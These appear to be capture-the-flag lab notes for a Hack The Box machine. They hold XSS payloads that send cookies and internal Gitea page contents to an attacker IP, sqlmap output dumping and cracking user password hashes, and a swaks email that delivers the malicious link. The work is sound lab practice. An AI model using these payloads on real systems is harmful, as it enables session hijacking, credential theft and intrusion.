# Cat

## XSS stored in bdd

<img src=x onerror=this.src="http://10.10.14.220:8000/"+btoa(document.cookie)>

## SQL Discovery

```bash
sqlmap -u http://$TARGET/accept_cat.php --cookie="PHPSESSID=99mqrq482ubk7bcg2sgmogf35v" --data="catName=bello&catId=1" -p catName --dbms=sqlite --level=5 --risk=3
        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.8.4.7#dev}
|_ -| . [,]     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 14:49:01 /2025-02-04/

[14:49:02] [INFO] testing connection to the target URL
[14:49:02] [INFO] checking if the target is protected by some kind of WAF/IPS
[14:49:02] [INFO] testing if the target URL content is stable
[14:49:02] [INFO] target URL content is stable
[14:49:03] [WARNING] heuristic (basic) test shows that POST parameter 'catName' might not be injectable
[14:49:03] [INFO] testing for SQL injection on POST parameter 'catName'
[14:49:03] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[14:49:07] [INFO] POST parameter 'catName' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --code=200)
[14:49:07] [INFO] testing 'Generic inline queries'
[14:49:07] [INFO] testing 'SQLite inline queries'
[14:49:07] [INFO] testing 'SQLite > 2.0 stacked queries (heavy query - comment)'
[14:49:07] [INFO] testing 'SQLite > 2.0 stacked queries (heavy query)'
[14:49:07] [INFO] testing 'SQLite > 2.0 AND time-based blind (heavy query)'
[14:49:14] [INFO] POST parameter 'catName' appears to be 'SQLite > 2.0 AND time-based blind (heavy query)' injectable
[14:49:14] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[14:49:14] [INFO] testing 'Generic UNION query (random number) - 1 to 20 columns'
[14:49:14] [INFO] testing 'Generic UNION query (NULL) - 21 to 40 columns'
[14:49:14] [INFO] testing 'Generic UNION query (random number) - 21 to 40 columns'
[14:49:14] [INFO] testing 'Generic UNION query (NULL) - 41 to 60 columns'
[14:49:14] [INFO] testing 'Generic UNION query (random number) - 41 to 60 columns'
[14:49:14] [INFO] testing 'Generic UNION query (NULL) - 61 to 80 columns'
[14:49:14] [INFO] testing 'Generic UNION query (random number) - 61 to 80 columns'
[14:49:14] [INFO] testing 'Generic UNION query (NULL) - 81 to 100 columns'
[14:49:14] [INFO] testing 'Generic UNION query (random number) - 81 to 100 columns'
[14:49:14] [INFO] checking if the injection point on POST parameter 'catName' is a false positive
POST parameter 'catName' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 84 HTTP(s) requests:
---
Parameter: catName (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: catName=bello'||(SELECT CHAR(77,102,99,71) WHERE 8208=8208 AND 7134=7134)||'&catId=1

    Type: time-based blind
    Title: SQLite > 2.0 AND time-based blind (heavy query)
    Payload: catName=bello'||(SELECT CHAR(108,87,108,103) WHERE 6947=6947 AND 1286=LIKE(CHAR(65,66,67,68,69,70,71),UPPER(HEX(RANDOMBLOB(500000000/2)))))||'&catId=1
---
[14:49:21] [INFO] the back-end DBMS is SQLite
web server operating system: Linux Ubuntu 20.04 or 20.10 or 19.10 (eoan or focal)
web application technology: Apache 2.4.41
back-end DBMS: SQLite
[14:49:21] [WARNING] HTTP error codes detected during run:
500 (Internal Server Error) - 42 times
[14:49:21] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/cat.htb'
[14:49:21] [WARNING] your sqlmap version is outdated

[*] ending @ 14:49:21 /2025-02-04/
```


## SQL Exploitation

--technique=B for boolean based and -T "users" for the name of table to dump

```bash
sqlmap -u http://$TARGET/accept_cat.php --cookie="PHPSESSID=99mqrq482ubk7bcg2sgmogf35v" --data="catName=bello&catId=1" -p catName --dbms=sqlite --level=5 --risk=3 --technique=B -T "users" --threads=7 --dump
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.8.4.7#dev}
|_ -| . [(]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 14:51:56 /2025-02-04/

[14:51:56] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: catName (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: catName=bello'||(SELECT CHAR(77,102,99,71) WHERE 8208=8208 AND 7134=7134)||'&catId=1
---
[14:51:56] [INFO] testing SQLite
[14:51:57] [INFO] confirming SQLite
[14:51:57] [INFO] actively fingerprinting SQLite
[14:51:57] [INFO] the back-end DBMS is SQLite
web server operating system: Linux Ubuntu 19.10 or 20.10 or 20.04 (focal or eoan)
web application technology: Apache 2.4.41
back-end DBMS: SQLite
[14:51:57] [INFO] retrieving the length of query output
[14:51:57] [INFO] retrieved: 159
[14:52:16] [INFO] retrieved: CREATE TABLE users (     user_id INTEGER PRIMARY KEY,     username VARCHAR(255) NOT NULL,     email VARCHAR(255) NOT NULL,     password VARCHAR(255) NOT NULL )
[14:52:16] [INFO] fetching entries for table 'users'
[14:52:16] [INFO] fetching number of entries for table 'users' in database 'SQLite_masterdb'
[14:52:16] [INFO] retrieved: 13
[14:52:17] [INFO] retrieving the length of query output
[14:52:17] [INFO] retrieved: 18
[14:52:22] [INFO] retrieved: axel2017@gmail.com
[14:52:22] [INFO] retrieving the length of query output
[14:52:22] [INFO] retrieved: 32
[14:52:27] [INFO] retrieved: d1bbba3670feb9435c9841e46e60ee2f
[14:52:27] [INFO] retrieving the length of query output
[14:52:27] [INFO] retrieved: 1
[14:52:28] [INFO] retrieved: 1
[14:52:28] [INFO] retrieving the length of query output
[14:52:28] [INFO] retrieved: 4
[14:52:29] [INFO] retrieved: axel
[14:52:29] [INFO] retrieving the length of query output
[14:52:29] [INFO] retrieved: 24
[14:52:32] [INFO] retrieved: rosamendoza485@gmail.com
[14:52:32] [INFO] retrieving the length of query output
[14:52:32] [INFO] retrieved: 32
[14:52:44] [INFO] retrieved: ac369922d560f17d6eeb8b2c7dec498c
[14:52:44] [INFO] retrieving the length of query output
[14:52:44] [INFO] retrieved: 1
[14:52:44] [INFO] retrieved: 2
[14:52:45] [INFO] retrieving the length of query output
[14:52:45] [INFO] retrieved: 4
[14:52:46] [INFO] retrieved: rosa
[14:52:46] [INFO] retrieving the length of query output
[14:52:46] [INFO] retrieved: 29
[14:52:51] [INFO] retrieved: robertcervantes2000@gmail.com
[14:52:51] [INFO] retrieving the length of query output
[14:52:51] [INFO] retrieved: 32
[14:52:58] [INFO] retrieved: 42846631708f69c00ec0c0a8aa4a92ad
[14:52:58] [INFO] retrieving the length of query output
[14:52:58] [INFO] retrieved: 1
[14:53:00] [INFO] retrieved: 3
[14:53:00] [INFO] retrieving the length of query output
[14:53:00] [INFO] retrieved: 6
[14:53:02] [INFO] retrieved: robert
[14:53:02] [INFO] retrieving the length of query output
[14:53:02] [INFO] retrieved: 29
[14:53:08] [INFO] retrieved: fabiancarachure2323@gmail.com
[14:53:08] [INFO] retrieving the length of query output
[14:53:08] [INFO] retrieved: 32
[14:53:15] [INFO] retrieved: 39e153e825c4a3d314a0dc7f7475ddbe
[14:53:15] [INFO] retrieving the length of query output
[14:53:15] [INFO] retrieved: 1
[14:53:15] [INFO] retrieved: 4
[14:53:16] [INFO] retrieving the length of query output
[14:53:16] [INFO] retrieved: 6
[14:53:17] [INFO] retrieved: fabian
[14:53:17] [INFO] retrieving the length of query output
[14:53:17] [INFO] retrieved: 22
[14:53:20] [INFO] retrieved: jerrysonC343@gmail.com
[14:53:20] [INFO] retrieving the length of query output
[14:53:20] [INFO] retrieved: 32
[14:53:24] [INFO] retrieved: 781593e060f8d065cd7281c5ec5b4b86
[14:53:24] [INFO] retrieving the length of query output
[14:53:24] [INFO] retrieved: 1
[14:53:25] [INFO] retrieved: 5
[14:53:25] [INFO] retrieving the length of query output
[14:53:25] [INFO] retrieved: 8
[14:53:26] [INFO] retrieved: jerryson
[14:53:26] [INFO] retrieving the length of query output
[14:53:26] [INFO] retrieved: 20
[14:53:29] [INFO] retrieved: larryP5656@gmail.com
[14:53:29] [INFO] retrieving the length of query output
[14:53:29] [INFO] retrieved: 32
[14:53:33] [INFO] retrieved: 1b6dce240bbfbc0905a664ad199e18f8
[14:53:33] [INFO] retrieving the length of query output
[14:53:33] [INFO] retrieved: 1
[14:53:33] [INFO] retrieved: 6
[14:53:34] [INFO] retrieving the length of query output
[14:53:34] [INFO] retrieved: 5
[14:53:35] [INFO] retrieved: larry
[14:53:35] [INFO] retrieving the length of query output
[14:53:35] [INFO] retrieved: 25
[14:53:38] [INFO] retrieved: royer.royer2323@gmail.com
[14:53:38] [INFO] retrieving the length of query output
[14:53:38] [INFO] retrieved: 30
[14:53:42] [INFO] retrieved: c598f6b844a36fa7836fba0835f1f6
[14:53:42] [INFO] retrieving the length of query output
[14:53:42] [INFO] retrieved: 1
[14:53:43] [INFO] retrieved: 7
[14:53:43] [INFO] retrieving the length of query output
[14:53:43] [INFO] retrieved: 5
[14:53:44] [INFO] retrieved: royer
[14:53:44] [INFO] retrieving the length of query output
[14:53:44] [INFO] retrieved: 20
[14:53:47] [INFO] retrieved: peterCC456@gmail.com
[14:53:47] [INFO] retrieving the length of query output
[14:53:47] [INFO] retrieved: 32
[14:53:51] [INFO] retrieved: e41ccefa439fc454f7eadbf1f139ed8a
[14:53:51] [INFO] retrieving the length of query output
[14:53:51] [INFO] retrieved: 1
[14:53:52] [INFO] retrieved: 8
[14:53:52] [INFO] retrieving the length of query output
[14:53:52] [INFO] retrieved: 5
[14:53:54] [INFO] retrieved: peter
[14:53:54] [INFO] retrieving the length of query output
[14:53:54] [INFO] retrieved: 19
[14:53:57] [INFO] retrieved: angel234g@gmail.com
[14:53:57] [INFO] retrieving the length of query output
[14:53:57] [INFO] retrieved: 32
[14:54:00] [INFO] retrieved: 24a8ec003ac2e1b3c5953a6f95f8f565
[14:54:00] [INFO] retrieving the length of query output
[14:54:00] [INFO] retrieved: 1
[14:54:01] [INFO] retrieved: 9
[14:54:01] [INFO] retrieving the length of query output
[14:54:01] [INFO] retrieved: 5
[14:54:02] [INFO] retrieved: angel
[14:54:02] [INFO] retrieving the length of query output
[14:54:02] [INFO] retrieved: 20
[14:54:05] [INFO] retrieved: jobert2020@gmail.com
[14:54:05] [INFO] retrieving the length of query output
[14:54:05] [INFO] retrieved: 32
[14:54:11] [INFO] retrieved: 88e4dceccd48820cf77b5cf6c08698ad
[14:54:11] [INFO] retrieving the length of query output
[14:54:11] [INFO] retrieved: 2
[14:54:11] [INFO] retrieved: 10
[14:54:11] [INFO] retrieving the length of query output
[14:54:11] [INFO] retrieved: 6
[14:54:13] [INFO] retrieved: jobert
[14:54:13] [INFO] retrieving the length of query output
[14:54:13] [INFO] retrieved: 12
[14:54:16] [INFO] retrieved: test@test.fr
[14:54:16] [INFO] retrieving the length of query output
[14:54:16] [INFO] retrieved: 32
[14:54:22] [INFO] retrieved: 4c3b6c7517e9f780744f6582f2d36fb6
[14:54:22] [INFO] retrieving the length of query output
[14:54:22] [INFO] retrieved: 2
[14:54:23] [INFO] retrieved: 11
[14:54:23] [INFO] retrieving the length of query output
[14:54:23] [INFO] retrieved: 6
[14:54:24] [INFO] retrieved: Mememe
[14:54:24] [INFO] retrieving the length of query output
[14:54:24] [INFO] retrieved: 12
[14:54:26] [INFO] retrieved: nite@htb.com
[14:54:26] [INFO] retrieving the length of query output
[14:54:26] [INFO] retrieved: 32
[14:54:30] [INFO] retrieved: 1720dbb32d3e73f44633c38022a58023
[14:54:30] [INFO] retrieving the length of query output
[14:54:30] [INFO] retrieved: 2
[14:54:31] [INFO] retrieved: 12
[14:54:31] [INFO] retrieving the length of query output
[14:54:31] [INFO] retrieved: 4
[14:54:33] [INFO] retrieved: nite
[14:54:33] [INFO] retrieving the length of query output
[14:54:33] [INFO] retrieved: 14
[14:54:36] [INFO] retrieved: hush@gmail.com
[14:54:36] [INFO] retrieving the length of query output
[14:54:36] [INFO] retrieved: 32
[14:54:41] [INFO] retrieved: 588d39bce7c5fcae6a8529c3997387ea
[14:54:41] [INFO] retrieving the length of query output
[14:54:41] [INFO] retrieved: 2
[14:54:42] [INFO] retrieved: 13
[14:54:42] [INFO] retrieving the length of query output
[14:54:42] [INFO] retrieved: 4
[14:54:43] [INFO] retrieved: hush
[14:54:43] [INFO] recognized possible password hashes in column 'password'
do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] y
[14:55:41] [INFO] writing hashes to a temporary file '/tmp/sqlmapgncxjbjh23967/sqlmaphashes-__wzofe4.txt'
do you want to crack them via a dictionary-based attack? [Y/n/q] Y
[14:55:45] [INFO] using hash method 'md5_generic_passwd'
what dictionary do you want to use?
[1] default dictionary file '/opt/tools/sqlmap/data/txt/wordlist.tx_' (press Enter)
[2] custom dictionary file
[3] file with list of dictionary files
> /opt/rockyou.txt
[14:56:14] [INFO] using default dictionary
do you want to use common password suffixes? (slow!) [y/N] N
[14:56:18] [INFO] starting dictionary-based cracking (md5_generic_passwd)
[14:56:18] [INFO] starting 8 processes
[14:56:25] [INFO] cracked password 'Azerty123' for user 'Mememe'
[14:56:43] [INFO] cracked password 'hush' for user 'hush'
[14:57:00] [INFO] cracked password 'hush' for user 'hush'
Database: <current>
Table: users
[13 entries]
+---------+-------------------------------+----------------------------------------------+----------+
| user_id | email                         | password                                     | username |
+---------+-------------------------------+----------------------------------------------+----------+
| 1       | axel2017@gmail.com            | d1bbba3670feb9435c9841e46e60ee2f             | axel     |
| 2       | rosamendoza485@gmail.com      | ac369922d560f17d6eeb8b2c7dec498c             | rosa     |
| 3       | robertcervantes2000@gmail.com | 42846631708f69c00ec0c0a8aa4a92ad             | robert   |
| 4       | fabiancarachure2323@gmail.com | 39e153e825c4a3d314a0dc7f7475ddbe             | fabian   |
| 5       | jerrysonC343@gmail.com        | 781593e060f8d065cd7281c5ec5b4b86             | jerryson |
| 6       | larryP5656@gmail.com          | 1b6dce240bbfbc0905a664ad199e18f8             | larry    |
| 7       | royer.royer2323@gmail.com     | c598f6b844a36fa7836fba0835f1f6               | royer    |
| 8       | peterCC456@gmail.com          | e41ccefa439fc454f7eadbf1f139ed8a             | peter    |
| 9       | angel234g@gmail.com           | 24a8ec003ac2e1b3c5953a6f95f8f565             | angel    |
| 10      | jobert2020@gmail.com          | 88e4dceccd48820cf77b5cf6c08698ad             | jobert   |
| 11      | test@test.fr                  | 4c3b6c7517e9f780744f6582f2d36fb6 (Azerty123) | Mememe   |
| 12      | nite@htb.com                  | 1720dbb32d3e73f44633c38022a58023             | nite     |
| 13      | hush@gmail.com                | 588d39bce7c5fcae6a8529c3997387ea (hush)      | hush     |
+---------+-------------------------------+----------------------------------------------+----------+

[14:57:01] [INFO] table 'SQLite_masterdb.users' dumped to CSV file '/root/.local/share/sqlmap/output/cat.htb/dump/SQLite_masterdb/users.csv'
[14:57:01] [WARNING] HTTP error codes detected during run:
500 (Internal Server Error) - 3648 times
[14:57:01] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/cat.htb'
[14:57:01] [WARNING] your sqlmap version is outdated

[*] ending @ 14:57:01 /2025-02-04/
```

Then we crack rosa hash : soyunaprincesarosa

We can login in ssh, there is port 25 587 and 3000. 3000 is Gitea 1.22 -> stored xss in repo name

<a href=javascript:alert()>XSS test</a>

We try to create an other payload, but no luck yet.²²
<a href=javascript:fetch('http://10.10.14.220:8000/steal?cookie='+document.cookie)>XSS Test</a>
<a href=javascript:alert(document.cookie())>XSS test</a>


<script>
fetch("http://localhost:3000/")
  .then(response => response.text())
  .then(data => {
    fetch("http://10.10.14.220:8000", {
      method: "POST",
      body: data)
    });
  });
</script>

It's not working, let's try SSRF to show the content of a file (read the mail again)

`http://localhost:3000/administrator/Employee-management/raw/branch/main/README.md.`

<script>
fetch('http://localhost:3000/axel/test/')
  .then(response => response.text())
  .then(data => {
    fetch("http://10.10.14.101:8000", {
      method: "POST",
      body: data)
    });
  });
</script>

Try in alert
<a href="javascript:fetch('http://localhost:3000/axel/test/').then(response => response.text()).then(data => alert(data))">Click me</a>

Try in fetch
<a href="javascript:fetch('http://localhost:3000/axel/test/').then(response => response.text()).then(data => fetch('http://10.10.14.101:8000?data='+encodeURIComponent(data)))">Click me</a>

try b but doesn't work
<a href="javascript:fetch('http://localhost:3000/internal/api/secrets').then(res => res.text()).then(data => fetch('https://your-server.com/log?data='+btoa(data)))">Click me</a>

trying with an image but doesn't work
<img src="x" onerror="javascript:fetch('http://localhost:3000/axel/test/').then(response => response.text()).then(data => fetch('http://10.10.14.101:8000?data='+encodeURIComponent(data)))">

try another one, not working either
<img src="x" onerror="this.onerror=null; fetch('http://localhost:3000/axel/test/').then(response => response.text()).then(data => fetch('http://10.10.14.101:8000?data='+encodeURIComponent(data)))">

no
<img src="x" onerror="javascript:fetch('http://localhost:3000/axel/test/').then(response => response.text()).then(data => alert(data))">

still not
<img src="x" onerror="fetch('http://localhost:3000/axel/test/').then(response => response.text()).then(data => console.log(data))">


let's try sending the link by mail and see if it work
swaks --to jobert@localhost --from axel@localhost --header "Subject: Exploit" --body "http://localhost:3000/axel/test" --server 127.0.0.1

it worked !

Now let's try to get some real important info :

<a href="javascript:fetch('http://localhost:3000/administrator/Employee-management/raw/branch/main/README.md').then(response => response.text()).then(data => fetch('http://10.10.14.101:8000?data='+encodeURIComponent(data)))">Click me</a>

got
```
# Employee Management
Site under construction. Authorized user: admin. No visibility or updates visible to employees.
```

trying
<a href="javascript:fetch('http://localhost:3000/administrator/Employee-management/').then(response => response.text()).then(data => fetch('http://10.10.14.101:8000?data='+encodeURIComponent(data)))">Click me</a>

we find `index.php`

let's try to show this file :
<a href="javascript:fetch('http://localhost:3000/administrator/Employee-management/raw/branch/main/index.php').then(response => response.text()).then(data => fetch('http://10.10.14.101:8000?data='+encodeURIComponent(data)))">Click me</a>

And boom we got root password !
cd ~
mkdir test
cd test
touch README.md
git init
git checkout -b main
git add README.md
git config user.email "you@example.com"
git config user.name "Your Name"
git commit -m "first commit"
git remote add origin http://localhost:3000/axel/test.git
git push -u origin main
